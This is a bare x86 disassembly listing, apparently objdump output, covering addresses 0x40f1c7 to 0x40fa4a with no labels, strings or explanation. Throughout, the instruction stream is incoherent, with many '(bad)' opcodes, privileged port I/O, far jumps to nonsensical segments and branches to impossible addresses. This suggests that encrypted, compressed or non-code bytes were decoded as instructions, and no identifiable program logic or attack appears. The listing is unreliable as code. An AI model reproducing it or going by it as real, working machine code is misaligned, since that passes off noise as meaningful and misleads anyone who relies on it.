  40f1c7:	jle    0x40f16c
  40f1c9:	mov    eax,fs
  40f1cb:	ins    DWORD PTR es:[edi],dx
  40f1cc:	mov    edx,0x5360f5fb
  40f1d1:	clc    
  40f1d2:	and    DWORD PTR [esp+edi*4],0xfe9474c
  40f1d9:	mov    edx,0x6c4fdd08
  40f1de:	add    bh,al
  40f1e0:	dec    esi
  40f1e1:	xchg   esp,eax
  40f1e2:	pop    ebp
  40f1e3:	add    BYTE PTR ds:0xb500486d,bh
  40f1e9:	div    DWORD PTR [ebp-0x1f42698c]
  40f1ef:	sti    
  40f1f0:	or     esp,DWORD PTR [edi+esi*8]
  40f1f3:	or     eax,DWORD PTR [eax]
	...
  40f205:	add    BYTE PTR [eax],al
  40f207:	add    BYTE PTR [ebp-0x64],ah
  40f20a:	movmskps edi,xmm5
  40f20d:	xchg   esi,eax
  40f20e:	or     bh,ch
  40f210:	cmp    ebx,DWORD PTR [eax-0x691b99e6]
  40f216:	pop    eax
  40f217:	call   DWORD PTR [eax]
  40f219:	(bad)  
  40f21a:	in     eax,dx
  40f21b:	add    ecx,DWORD PTR [ebx]
  40f21d:	and    eax,0xc369e8f7
  40f222:	cmc    
  40f223:	jmp    FWORD PTR [ecx-0x1f]
  40f226:	mov    ch,0xb9
  40f228:	push   0x25
  40f22a:	idiv   edi
  40f22c:	inc    edi
  40f22d:	je     0x40f26c
  40f22f:	pop    es
  40f230:	rcl    al,0xf6
  40f233:	jne    0x40f27e
  40f235:	and    eax,0xa73d087d
  40f23a:	pop    edx
  40f23b:	dec    DWORD PTR [edx]
  40f23d:	lds    edi,FWORD PTR [edi+0x5b9631c2]
  40f243:	mov    edi,ecx
  40f245:	adc    dl,cl
  40f247:	call   0x4ba0bcf2
  40f24c:	je     0x40f1de
  40f24e:	or     BYTE PTR [ebp+0x31],dh
  40f251:	aas    
  40f252:	enter  0x250c,0x98
  40f256:	or     BYTE PTR [edx+0x25],ch
  40f259:	cwde   
  40f25a:	cmc    
  40f25b:	inc    DWORD PTR [eax]
  40f25d:	cli    
  40f25e:	pop    edi
  40f25f:	add    BYTE PTR [edi-0x5a6a1f70],cl
  40f265:	nop
  40f266:	or     BYTE PTR [ecx+0x75f70e20],cl
	...
  40f280:	ins    DWORD PTR es:[edi],dx
  40f281:	sbb    eax,0x628c54dd
  40f286:	cwde   
  40f287:	mov    BYTE PTR [ecx+0x47],dl
  40f28a:	cwde   
  40f28b:	je     0x40f261
  40f28d:	push   edx
  40f28e:	push   ds
  40f28f:	cld    
  40f290:	ss mov edx,0xd5907498
  40f296:	or     DWORD PTR [edx-0x74],ebp
  40f299:	push   ebx
  40f29a:	sbb    al,0x40
  40f29c:	mov    ebx,gs
  40f29e:	jbe    0x40f2e4
  40f2a0:	mov    al,ds:0x3600143b
  40f2a5:	jmp    0x40f2ba
  40f2a7:	adc    ah,BYTE PTR [esi]
  40f2a9:	jmp    0x40f243
  40f2ab:	je     0x40f23d
  40f2ad:	xchg   edx,eax
  40f2ae:	(bad)  
  40f2af:	imul   edx,edi,0x4c850a2c
  40f2b5:	bnd jno 0x40f23f
  40f2b8:	mov    ebx,gs
  40f2ba:	or     DWORD PTR [ebx+0x1171d7d9],ecx
  40f2c0:	sbb    DWORD PTR [eax-0x1409b064],esi
  40f2c6:	movhlps xmm4,xmm6
  40f2c9:	jmp    0x40f2dc
  40f2cb:	aaa    
  40f2cc:	jmp    0x863f:0xc1ff0cac
  40f2d3:	push   ecx
  40f2d4:	pushf  
  40f2d5:	push   0x2adb77cc
  40f2da:	adc    al,dh
  40f2dc:	and    al,0xab
  40f2de:	dec    eax
  40f2df:	jmp    FWORD PTR [ebx]
  40f2e1:	test   BYTE PTR [edi],bh
  40f2e3:	call   0x40f2e8
	...
  40f2f8:	xchg   edi,eax
  40f2f9:	sub    edx,DWORD PTR [ecx]
  40f2fb:	dec    eax
  40f2fc:	sbb    esp,DWORD PTR [eax-0x685f186c]
  40f302:	test   esi,edi
  40f304:	adc    eax,0x79fea8b0
  40f309:	jnp    0x40f29f
  40f30b:	push   edx
  40f30c:	dec    edx
  40f30d:	push   0xffffff85
  40f30f:	(bad)  
  40f310:	jns    0x40f2a6
  40f312:	push   edi
  40f313:	(bad)  
  40f314:	pusha  
  40f315:	call   0xec1d0c70
  40f31a:	and    al,0x40
  40f31c:	(bad)  
  40f31e:	jmp    0x8c03:0xd79d5fc3
  40f325:	jmp    0x8c79829f
  40f32a:	inc    edi
  40f32b:	mov    al,0x4b
  40f32d:	stc    
  40f32e:	es (bad) 
  40f330:	cmp    ah,ch
  40f332:	sbb    DWORD PTR cs:[eax-0x54046308],edi
  40f339:	(bad)  
  40f33a:	mov    al,0x8e
  40f33c:	call   0x939e:0xab9f9cf8
  40f343:	mov    cs,WORD PTR [edx+0x6b937cf8]
  40f349:	or     DWORD PTR [ebx-0x62f38572],ebp
  40f34f:	xchg   edi,eax
  40f350:	push   es
  40f351:	mov    ds:0xf86018ee,eax
  40f356:	xor    esp,edi
  40f358:	bound  eax,QWORD PTR [edx+0x9bdb]
	...
  40f36e:	add    BYTE PTR [eax],al
  40f370:	push   ebp
  40f371:	fs (bad) 
  40f373:	mov    es,WORD PTR [ebx+edx*8-0x5]
  40f377:	add    esp,ecx
  40f379:	or     eax,esp
  40f37b:	mov    ?,WORD PTR [eax-0x2bbd3878]
  40f381:	mul    DWORD PTR [esi-0x277f0c06]
  40f387:	sbb    ecx,DWORD PTR [eax-0x43fbdf92]
  40f38d:	in     al,dx
  40f38e:	scas   al,BYTE PTR es:[edi]
  40f38f:	ss sbb edi,eax
  40f392:	das    
  40f393:	sbb    al,0xde
  40f395:	rcr    DWORD PTR [edi],cl
  40f397:	add    al,0x74
  40f399:	xchg   esp,eax
  40f39a:	fistp  WORD PTR [esi-0x44f792bf]
  40f3a0:	mov    cl,0x55
  40f3a2:	or     BYTE PTR [ecx],bl
  40f3a4:	add    eax,DWORD PTR [ecx+0x7ae55100]
  40f3aa:	cmc    
  40f3ab:	pop    esi
  40f3ac:	pop    es
  40f3ad:	cmp    bl,BYTE PTR [edx+0x56]
  40f3b0:	or     dh,bh
  40f3b2:	jnp    0x40f391
  40f3b4:	test   DWORD PTR [ecx-0x74e5b9b0],0x6fe0b5c8
  40f3be:	sub    edi,ecx
  40f3c0:	push   eax
  40f3c1:	xchg   esp,eax
  40f3c2:	pop    eax
  40f3c3:	inc    ecx
  40f3c4:	and    eax,0x5f26f55e
  40f3c9:	ins    BYTE PTR es:[edi],dx
  40f3ca:	mov    edx,0x60944f2a
  40f3cf:	jmp    0x81f7db63
	...
  40f3e8:	mov    ebp,0xbfe94771
  40f3ed:	idiv   DWORD PTR [ebx-0xf]
  40f3f0:	daa    
  40f3f1:	loopne 0x40f465
  40f3f3:	test   BYTE PTR [ecx],0xef
  40f3f6:	jg     0x40f392
  40f3f8:	add    dh,dh
  40f3fa:	mov    edi,0x5cf768ab
  40f3ff:	jb     0x40f42d
  40f401:	adc    cl,ch
  40f403:	aad    0x76
  40f405:	xchg   esp,eax
  40f406:	bound  ecx,QWORD PTR ds:0xd1008001
  40f40c:	in     eax,0x47
  40f40e:	cmc    
  40f40f:	mov    esi,0x43f450c7
  40f414:	idiv   BYTE PTR es:[ebx-0x1f]
  40f418:	pop    ss
  40f419:	addr16 cmc 
  40f41b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f41c:	sbb    DWORD PTR [ebp+0x29],ebp
  40f41f:	sahf   
  40f420:	jnp    0x40f3ae
  40f422:	loopne 0x40f433
  40f424:	or     esi,esi
  40f426:	cmc    
  40f427:	add    ebx,DWORD PTR [esi+esi*8]
  40f42a:	jnp    0x40f42c
  40f42c:	std    
  40f42d:	sbb    dl,BYTE PTR [edx-0x1]
  40f430:	or     BYTE PTR [ecx],0xf7
  40f433:	jne    0x40f3b6
  40f435:	or     DWORD PTR [ebp+0x8],edi
  40f438:	or     eax,0x72ff45cf
  40f43d:	cmp    ecx,eax
  40f43f:	add    al,0xf5
  40f441:	mov    ebp,0x9f42ec81
  40f446:	add    al,0xe8
  40f448:	push   ebp
  40f449:	shl    ebp,0xff
	...
  40f460:	mov    esi,0xdd2479d2
  40f465:	mov    ecx,0xc2a5416e
  40f46a:	loopne 0x40f488
  40f46c:	sbb    cl,BYTE PTR [eax]
  40f46e:	not    DWORD PTR [eax-0x3]
  40f471:	xchg   edx,eax
  40f472:	or     bh,ch
  40f474:	inc    ebx
  40f475:	cwde   
  40f476:	push   esp
  40f477:	data16 in al,0x92
  40f47a:	pop    eax
  40f47b:	(bad)  
  40f47c:	clc    
  40f47d:	cli    
  40f47e:	in     eax,dx
  40f47f:	pop    es
  40f480:	adc    DWORD PTR [ecx],ecx
  40f482:	imul   eax
  40f484:	(bad)
  40f488:	lods   al,BYTE PTR ds:[esi]
  40f489:	ror    BYTE PTR ds:0xe17d1800,cl
  40f48f:	cmp    DWORD PTR [ecx],0x6
  40f492:	pusha  
  40f493:	add    BYTE PTR [edi+0x6d75f6c5],bh
  40f499:	sbb    bh,BYTE PTR [eax]
  40f49b:	push   eax
  40f49c:	inc    edx
  40f49d:	or     DWORD PTR [ecx+0x129c5145],eax
  40f4a3:	(bad)  
  40f4a4:	js     0x40f49e
  40f4a6:	in     eax,dx
  40f4a7:	stos   BYTE PTR es:[edi],al
  40f4a8:	add    cl,BYTE PTR [ecx]
  40f4aa:	imul   DWORD PTR [edx-0x7a]
  40f4ad:	pop    es
  40f4ae:	jge    0x40f4b8
  40f4b0:	std    
  40f4b1:	jno    0x40f4a9
  40f4b3:	inc    DWORD PTR [edx]
  40f4b5:	pushf  
  40f4b6:	adc    al,0xff
  40f4b8:	mov    WORD PTR [eax+0x6fae7f4],ds
  40f4be:	test   esi,edi
  40f4c0:	or     edi,ecx
  40f4c2:	test   esi,edi
	...
  40f4d8:	jns    0x40f4dd
  40f4da:	xchg   edx,eax
  40f4db:	dec    ebx
  40f4dc:	pop    esp
  40f4dd:	jle    0x40f463
  40f4df:	enter  0xefce,0x9
  40f4e3:	push   ebp
  40f4e4:	pop    ss
  40f4e5:	pusha  
  40f4e6:	mov    bl,al
  40f4e8:	in     al,0x3e
  40f4ea:	adc    BYTE PTR [eax],al
  40f4ec:	popfw  
  40f4ee:	xor    DWORD PTR [esp+eax*4+0x53],0xffffff94
  40f4f3:	dec    esi
  40f4f4:	retf   
  40f4f5:	dec    esi
  40f4f6:	jb     0x40f53c
  40f4f8:	rol    BYTE PTR [edx+0x2c445bc6],0xa
  40f4ff:	xor    BYTE PTR [ebx-0x15],0x1d
  40f503:	inc    edi
  40f504:	xor    al,0x7
  40f506:	sub    al,0x41
  40f508:	mov    WORD PTR [esi],?
  40f50a:	xchg   edx,eax
  40f50b:	adc    DWORD PTR [ebx-0x15],ebx
  40f50e:	or     DWORD PTR [ebx],ecx
  40f510:	int3   
  40f511:	pop    ds
  40f512:	rcl    BYTE PTR [esi+0x74],1
  40f515:	add    eax,0x283ff26
  40f51a:	retf   0xac73
  40f51d:	je     0x40f56d
  40f51f:	clc    
  40f520:	in     al,0xeb
  40f522:	or     edi,ebp
  40f524:	sub    ah,BYTE PTR [ebx+0xf]
  40f527:	data16 int 0xeb
  40f52a:	xor    BYTE PTR [esp+edx*2-0x22],0x17
  40f52f:	or     BYTE PTR [ecx+edx*2+0x5],ah
  40f533:	dec    DWORD PTR [ebx-0x32]
  40f536:	pop    ss
  40f537:	clc    
  40f538:	xor    al,0xbb
  40f53a:	inc    DWORD PTR ds:[eax]
	...
  40f54d:	add    BYTE PTR [eax],al
  40f54f:	add    BYTE PTR [ebx],bh
  40f551:	aas    
  40f552:	fidivr WORD PTR [edi-0x17dda0b]
  40f558:	sub    edx,DWORD PTR [ecx+edx*4+0x1c8d5b5a]
  40f55f:	dec    ebp
  40f560:	sbb    bh,BYTE PTR [edi-0x65]
  40f563:	mov    ebx,DWORD PTR [eax+0x5ab1878c]
  40f569:	cmc    
  40f56a:	mov    gs,WORD PTR [ebx]
  40f56c:	aad    0xd1
  40f56e:	jmp    0x40f573
  40f570:	popa   
  40f571:	or     DWORD PTR [edi+eax*4+0x1e1eefcf],ecx
  40f578:	mov    WORD PTR [edx+0x2e],gs
  40f57b:	mov    ebx,DWORD PTR [eax-0x74]
  40f57e:	push   edi
  40f57f:	adc    ecx,DWORD PTR [ebx-0xb]
  40f582:	pop    esi
  40f583:	jge    0x40f5cd
  40f585:	clc    
  40f586:	push   0xffffffc9
  40f588:	addr16 dec esp
  40f58a:	mov    al,ds:0xdfb50c03
  40f58f:	rcpps  xmm5,XMMWORD PTR [ecx+esi*4+0x21]
  40f594:	dec    ebp
  40f595:	xchg   esp,eax
  40f596:	sahf   
  40f597:	fwait
  40f598:	add    eax,0x9703dfb6
  40f59d:	aam    0x9b
  40f59f:	fld    QWORD PTR [edx-0x14]
  40f5a2:	or     eax,0xeaf4932f
  40f5a7:	ret    
  40f5a8:	push   DWORD PTR [eax+edi*2-0x20827bbf]
  40f5af:	add    ebp,DWORD PTR [ebx+0x33]
  40f5b2:	mov    BYTE PTR [esi],cl
	...
  40f5c8:	jmp    0xeeec:0xe08adf55
  40f5cf:	adc    BYTE PTR [esp+edi*8-0xba4f22f],dl
  40f5d6:	ficom  WORD PTR [eax]
  40f5d8:	push   esp
  40f5d9:	std    
  40f5da:	xlat   BYTE PTR ds:[ebx]
  40f5db:	xor    al,0x4b
  40f5dd:	hlt    
  40f5de:	retf   
  40f5df:	(bad)  
  40f5e0:	add    ebp,DWORD PTR [esi]
  40f5e2:	mov    bh,0x8a
  40f5e4:	cmp    dh,ah
  40f5e6:	or     BYTE PTR [ebx+0x340dabd5],bh
  40f5ec:	fnstcw WORD PTR [ebx+0x8]
  40f5ef:	jmp    0x22a227fa
  40f5f4:	outs   dx,BYTE PTR ds:[esi]
  40f5f5:	push   ebp
  40f5f6:	or     BYTE PTR [ecx],al
  40f5f8:	fdivr  QWORD PTR [ecx+0x47]
  40f5fb:	jmp    0x91415f16
  40f600:	jmp    FWORD PTR [esi-0xb]
  40f603:	jle    0x40f59e
  40f605:	xchg   esp,eax
  40f606:	pusha  
  40f607:	ins    DWORD PTR es:[edi],dx
  40f608:	lods   eax,DWORD PTR ds:[esi]
  40f609:	push   ebp
  40f60a:	or     BYTE PTR [ecx],al
  40f60c:	inc    edi
  40f60d:	jns    0x40f656
  40f60f:	jmp    0xb2119f2a
  40f614:	push   eax
  40f615:	xchg   esp,eax
  40f616:	loopne 0x40f655
  40f618:	mov    ds:0x4c60f5f3,eax
  40f61d:	add    BYTE PTR [ebx-0x17],ah
  40f620:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f621:	add    eax,0x7c8fa86f
  40f626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f627:	iret   
  40f628:	dec    eax
  40f629:	xchg   esp,eax
  40f62a:	cmc    
  40f62b:	hlt    
	...
  40f640:	neg    DWORD PTR [ebx+0x47]
  40f643:	jmp    0x1e9e244f
  40f648:	push   es
  40f649:	sbb    eax,0x94711d4c
  40f64e:	pusha  
  40f64f:	ins    BYTE PTR es:[edi],dx
  40f650:	lods   eax,DWORD PTR ds:[esi]
  40f651:	push   ebp
  40f652:	or     BYTE PTR [ecx-0x16b8861a],dl
  40f658:	push   es
  40f659:	test   al,0xd0
  40f65b:	mov    eax,ds:0x49e094c8
  40f660:	mov    ebx,0xa370f5f3
  40f665:	in     al,0x83
  40f667:	and    al,0x2c
  40f669:	arpl   WORD PTR [eax-0x71],sp
  40f66c:	scas   al,BYTE PTR es:[edi]
  40f66d:	push   ebp
  40f66e:	or     BYTE PTR [ecx-0x1b],al
  40f671:	jns    0x40f6ba
  40f673:	add    BYTE PTR ds:0x7dd83d1c,dh
  40f679:	push   edi
  40f67a:	or     al,ch
  40f67c:	mov    eax,ds:0xacfff5a4
  40f681:	mov    bl,0xe0
  40f683:	sub    DWORD PTR [eax+0x4],0xfffffff6
  40f687:	jae    0x40f6e6
  40f689:	sbb    DWORD PTR [ebp-0x10],esi
  40f68c:	and    eax,0x98834aa3
  40f691:	or     al,0xf6
  40f693:	jae    0x40f65e
  40f695:	mov    es,WORD PTR [edi]
  40f697:	add    BYTE PTR [edx],cl
  40f699:	pop    esi
  40f69a:	div    BYTE PTR [ebp-0x13]
  40f69d:	push   cs
  40f69e:	repz dec ebp
  40f6a0:	jp     0x40f6bf
  40f6a2:	div    DWORD PTR [ebp+0x0]
	...
  40f6b5:	add    BYTE PTR [eax],al
  40f6b7:	add    BYTE PTR [ecx+0x1d],al
  40f6ba:	jge    0x40f6c4
  40f6bc:	cmp    eax,0x3aff46aa
  40f6c1:	sbb    eax,0xa35af07d
  40f6c6:	add    al,ch
  40f6c8:	repnz lods al,BYTE PTR ds:[esi]
  40f6ca:	cmc    
  40f6cb:	(bad)  
  40f6cc:	jp     0x40f671
  40f6ce:	in     al,0xff
  40f6d0:	lock out dx,al
  40f6d2:	in     eax,dx
  40f6d3:	cmp    al,0xb
  40f6d5:	sbb    al,0xf7
  40f6d7:	inc    DWORD PTR [eax]
  40f6d9:	adc    esi,edi
  40f6db:	jne    0x40f75a
  40f6dd:	sbb    eax,0x9a8d087d
  40f6e2:	inc    esi
  40f6e3:	call   FWORD PTR [edx-0x621382e5]
  40f6e9:	out    0x58,eax
  40f6eb:	(bad)  
  40f6ec:	jp     0x40f70b
  40f6ee:	jge    0x40f6e4
  40f6f0:	(bad)  
  40f6f1:	out    dx,eax
  40f6f2:	pop    eax
  40f6f3:	(bad)  
  40f6f4:	jp     0x40f713
  40f6f6:	jge    0x40f6e8
  40f6f8:	cmp    eax,0x3aff5799
  40f6fd:	sbb    eax,0xd38ce87d
  40f702:	test   BYTE PTR [edi+0x4b],cl
  40f705:	jecxz  0x40f687
  40f707:	je     0x40f749
  40f709:	fild   DWORD PTR [esi]
  40f70b:	or     BYTE PTR [edx+eiz*2],ah
  40f70e:	xor    bh,bh
  40f710:	xor    ecx,DWORD PTR [ebx-0x46f3e4f]
  40f716:	mov    esi,DWORD PTR es:[eax]
  40f719:	jg     0x40f6d0
  40f71b:	sti    
	...
  40f730:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f731:	sti    
  40f732:	adc    eax,DWORD PTR [eax+0x13]
  40f735:	xchg   ecx,eax
  40f736:	hlt    
  40f737:	out    0x9d,eax
  40f739:	xchg   ecx,eax
  40f73a:	jg     0x40f73a
  40f73c:	adc    eax,0x8c6980c1
  40f741:	test   DWORD PTR [eax+ebp*2],ecx
  40f744:	out    dx,eax
  40f745:	mov    eax,ds:0xfb740049
  40f74a:	or     DWORD PTR [eax],eax
  40f74c:	or     al,0x44
  40f74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f74f:	push   edx
  40f750:	fist   DWORD PTR [edx-0xc]
  40f753:	mov    edi,0xe83c9e58
  40f758:	pop    ss
  40f759:	es cmp esi,0x1905bb97
  40f760:	pop    esp
  40f761:	ret    
  40f762:	or     DWORD PTR [eax],eax
  40f764:	mov    ds:0x32de1169,eax
  40f769:	cmp    al,0xa
  40f76b:	push   eax
  40f76c:	mov    ds:0xffe7f210,eax
  40f771:	xor    al,0x81
  40f773:	(bad)  
  40f774:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f775:	addr16 cmp edi,edi
  40f778:	mov    esp,DWORD PTR [edx+0x7083fc06]
  40f77e:	icebp  
  40f77f:	out    0x8b,eax
  40f781:	inc    ecx
  40f782:	cmp    esi,0xfff5bd45
  40f788:	shl    BYTE PTR [esi-0x63],0x82
  40f78c:	dec    eax
  40f78d:	xchg   esp,eax
  40f78e:	jmp    0x40f7bf
  40f790:	out    0x94,al
  40f792:	pop    ecx
  40f793:	inc    ebp
	...
  40f7a8:	push   ebx
  40f7a9:	addr16 out 0x9b,eax
  40f7ac:	std    
  40f7ad:	pop    esi
  40f7ae:	mov    BYTE PTR [edi+0x7bcb5714],0x78
  40f7b5:	push   eax
  40f7b6:	aaa    
  40f7b7:	inc    ebp
  40f7b8:	mov    WORD PTR [edi+edi*8],ss
  40f7bb:	add    esp,DWORD PTR [eax-0x54fab8ac]
  40f7c1:	push   ebx
  40f7c2:	fild   QWORD PTR [esi]
  40f7c4:	and    al,0xc7
  40f7c6:	rol    DWORD PTR [ebx],cl
  40f7c8:	mov    WORD PTR [ebp+0x49af109f],ds
  40f7ce:	xchg   ebp,ebx
  40f7d0:	gs icebp 
  40f7d2:	mov    ?,ebx
  40f7d4:	cmp    ebp,DWORD PTR [eax-0x18]
  40f7d7:	xor    esp,DWORD PTR [esp+edx*4-0x21]
  40f7db:	xchg   esi,eax
  40f7dc:	sub    DWORD PTR [esi+ebp*8+0x1e],edi
  40f7e0:	dec    ebp
  40f7e1:	xchg   esp,eax
  40f7e2:	scas   eax,DWORD PTR es:[edi]
  40f7e3:	xchg   BYTE PTR [eax-0x64],ah
  40f7e6:	push   edi
  40f7e7:	aad    0x54
  40f7e9:	icebp  
  40f7ea:	pop    esi
  40f7eb:	pushf  
  40f7ec:	test   DWORD PTR [esi+eax*2-0x79],eax
  40f7f0:	(bad)  
  40f7f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7f2:	pop    ds
  40f7f3:	dec    ebp
  40f7f4:	mov    edx,0xbd8736f0
  40f7f9:	inc    ecx
  40f7fa:	clc    
  40f7fb:	(bad)  
  40f7fc:	and    ah,dl
  40f7fe:	adc    DWORD PTR es:[eax-0x4c046b10],esp
  40f805:	adc    BYTE PTR [ebp+0x28509286],ah
  40f80b:	ret    0x0
	...
  40f81e:	add    BYTE PTR [eax],al
  40f820:	(bad)  
  40f821:	xchg   esp,eax
  40f822:	mov    esp,0x2414777a
  40f827:	mov    dl,ah
  40f829:	jp     0x40f80a
  40f82b:	sbb    esi,ecx
  40f82d:	out    dx,eax
  40f82e:	or     BYTE PTR [edi+eiz*2-0x8],bh
  40f832:	inc    edi
  40f833:	pushf  
  40f834:	or     ch,bh
  40f836:	jg     0x40f864
  40f838:	add    al,0x1b
  40f83a:	xor    al,0x3d
  40f83c:	nop
  40f83d:	push   ebp
  40f83e:	or     BYTE PTR [ecx+0x52],ch
  40f841:	lock jns 0x40f86d
  40f844:	mov    al,ds:0x90286d87
  40f849:	inc    edi
  40f84a:	loopne 0x40f891
  40f84c:	inc    esp
  40f84d:	lock cmc 
  40f84f:	loop   0x40f8a0
  40f851:	sub    DWORD PTR fs:[esi],edx
  40f854:	add    BYTE PTR [eax],ch
  40f856:	push   eax
  40f857:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f858:	adc    bl,BYTE PTR [ebx+0x602115c8]
  40f85e:	pusha  
  40f85f:	jmp    0x1f7f7f3
  40f864:	jmp    0x7bef:0xbfe94776
  40f86b:	icebp  
  40f86c:	pop    ss
  40f86d:	xor    BYTE PTR [ecx+0x76],dh
  40f870:	adc    bh,al
  40f872:	mov    edi,0xf4ef0b1e
  40f877:	sbb    dl,al
  40f879:	sub    al,0xf6
  40f87b:	pop    esi
  40f87c:	or     ch,bh
  40f87e:	cli    
  40f87f:	xchg   edi,edx
  40f881:	xchg   esi,eax
  40f882:	jnp    0x40f8ad
	...
  40f898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f899:	mov    bl,0xe0
  40f89b:	cmc    
  40f89c:	imul   ebp,edi,0xfffffff5
  40f89f:	repnz iret 
  40f8a1:	arpl   WORD PTR [ecx+eax*8],bp
  40f8a4:	(bad)  
  40f8a5:	jbe    0x40f8ee
  40f8a7:	jmp    0xbad1f50b
  40f8ac:	adc    ch,bh
  40f8ae:	pop    eax
  40f8af:	xchg   ecx,eax
  40f8b0:	(bad)  
  40f8b1:	xchg   esp,eax
  40f8b2:	in     eax,0x57
  40f8b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8b5:	mov    gs,WORD PTR [ebp-0x58]
  40f8b8:	pop    DWORD PTR [ebp+esi*8+0x0]
  40f8bc:	clc    
  40f8bd:	jmp    0x40f8ac
  40f8bf:	or     DWORD PTR ds:0xf1e8f716,0xffffffa6
  40f8c6:	cmc    
  40f8c7:	dec    DWORD PTR [edi]
  40f8c9:	repnz in eax,dx
  40f8cb:	fst    QWORD PTR [esi+0x250bf719]
  40f8d1:	test   BYTE PTR [eax+ebp*2],ch
  40f8d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8d5:	xchg   ecx,eax
  40f8d6:	inc    edi
  40f8d7:	add    BYTE PTR [ebp+0x52536110],al
  40f8dd:	sbb    DWORD PTR [esi+0x68],eax
  40f8e0:	and    eax,0xcdbee593
  40f8e5:	imul   BYTE PTR [esi+0x41]
  40f8e8:	xor    eax,0x1d75f5a3
  40f8ed:	or     ebx,DWORD PTR [edx+0x78]
  40f8f0:	repnz sbb dh,ch
  40f8f3:	pop    ebp
  40f8f4:	mov    dl,0x19
  40f8f6:	idiv   edi
  40f8f8:	cwde   
  40f8f9:	sbb    al,0xf7
  40f8fb:	jne    0x40f8fd
	...
  40f90d:	add    BYTE PTR [eax],al
  40f90f:	add    ch,bh
  40f911:	or     al,dh
  40f913:	dec    esp
  40f914:	jb     0x40f92f
  40f916:	push   edi
  40f917:	leave  
  40f918:	aaa    
  40f919:	xchg   esp,eax
  40f91a:	or     BYTE PTR [ebp+0x6e],dl
  40f91d:	or     al,0x8b
  40f91f:	les    esi,FWORD PTR ds:0x15f04c67
  40f925:	sbb    BYTE PTR [ebp+0xc],bh
  40f928:	dec    ebp
  40f929:	cmp    DWORD PTR [edx-0x1],ebx
  40f92c:	push   edx
  40f92d:	in     eax,dx
  40f92e:	mov    ch,0x74
  40f930:	mov    bh,0x13
  40f932:	jne    0x40f930
  40f934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f935:	mov    al,ds:0x1af88b29
  40f93a:	ins    BYTE PTR es:[edi],dx
  40f93b:	sbb    DWORD PTR [ebp-0x738ad83a],0x72107d19
  40f945:	lahf   
  40f946:	add    al,ch
  40f948:	mov    WORD PTR [eax-0x607c00d1],?
  40f94e:	add    eax,0x81717bfc
  40f953:	(bad)  
  40f954:	stc    
  40f955:	jecxz  0x40f8e8
  40f957:	hlt    
  40f958:	xlat   BYTE PTR ds:[ebx]
  40f959:	out    0x8c,al
  40f95b:	mov    ecx,cs
  40f95d:	jmp    0x40f998
  40f95f:	call   0xfecca9fd
  40f964:	inc    ebp
  40f965:	cmp    bh,dh
  40f967:	jmp    eax
  40f969:	jb     0x40f908
  40f96b:	or     BYTE PTR [eax-0x3c],0xf
  40f96f:	add    BYTE PTR [esi+0x748bba],ah
	...
  40f985:	add    BYTE PTR [eax],al
  40f987:	add    BYTE PTR [ebx+eax*8+0x272b4bd4],al
  40f98e:	jae    0x40f9d4
  40f990:	and    BYTE PTR [edx+0xc],dl
  40f993:	push   0xffffff8c
  40f995:	or     esi,0x66
  40f998:	int    0xfb
  40f99a:	adc    DWORD PTR [edx],eax
  40f99c:	mov    ebx,?
  40f99e:	mov    edi,esp
  40f9a0:	std    
  40f9a1:	lods   al,BYTE PTR ds:[esi]
  40f9a2:	mov    edi,esi
  40f9a4:	xchg   DWORD PTR [ebx],edi
  40f9a6:	push   es
  40f9a7:	aas    
  40f9a8:	add    eax,0x166784b9
  40f9ad:	lahf   
  40f9ae:	dec    ecx
  40f9af:	add    bl,ah
  40f9b1:	call   0xb2d6e137
  40f9b6:	or     al,0x0
  40f9b8:	xchg   DWORD PTR [ebx-0x2f34dcfb],edi
  40f9be:	and    edi,0xfe8d2417
  40f9c4:	pop    esp
  40f9c5:	ret    
  40f9c6:	cmp    cl,cl
  40f9c8:	dec    esp
  40f9c9:	sti    
  40f9ca:	adc    DWORD PTR [eax],eax
  40f9cc:	mov    WORD PTR [esi+0x4b],ss
  40f9cf:	imul   ecx,DWORD PTR [ebx+ecx*1-0x6b7b8b73],0xed189917
  40f9da:	push   ss
  40f9db:	fwait
  40f9dc:	sub    DWORD PTR [esi+0x1e],ebx
  40f9df:	test   BYTE PTR [edx+0x219b1767],al
  40f9e5:	pop    esi
  40f9e6:	push   cs
  40f9e7:	test   BYTE PTR [edx+0x67],dh
  40f9ea:	repz add DWORD PTR [eax],0x0
	...
  40f9fe:	add    BYTE PTR [eax],al
  40fa00:	loopne 0x40f99e
  40fa02:	pop    es
  40fa03:	cli    
  40fa04:	xlat   BYTE PTR ds:[ebx]
  40fa05:	in     eax,dx
  40fa06:	out    0xb9,al
  40fa08:	dec    ebp
  40fa09:	cwde   
  40fa0a:	(bad)  
  40fa0c:	push   es
  40fa0d:	add    BYTE PTR [ebx+0x48],ah
  40fa10:	inc    edi
  40fa11:	jp     0x40f9f2
  40fa13:	in     eax,dx
  40fa14:	iret   
  40fa15:	in     eax,dx
  40fa16:	pop    esp
  40fa17:	or     al,0x24
  40fa19:	aas    
  40fa1a:	cmp    eax,DWORD PTR [ebx-0x7fd2e4ce]
  40fa20:	mov    bl,0x94
  40fa22:	fbstp  TBYTE PTR [edx-0x1f]
  40fa25:	jnp    0x40fa6b
  40fa27:	jmp    0x40f9f5
  40fa29:	xchg   esp,eax
  40fa2a:	pop    ss
  40fa2b:	xchg   esi,eax
  40fa2c:	stos   BYTE PTR es:[edi],al
  40fa2d:	push   ebx
  40fa2e:	fild   WORD PTR [edx-0x63786380]
  40fa34:	jp     0x40fa23
  40fa36:	xchg   BYTE PTR [ebx-0x6710f80],al
  40fa3c:	mov    edi,esp
  40fa3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fa3f:	iret   
  40fa40:	jmp    0x1c94:0x8f46a8ec
  40fa47:	(bad)  
  40fa48:	out    0x10,eax
  40fa4a:	and    al,0x7c
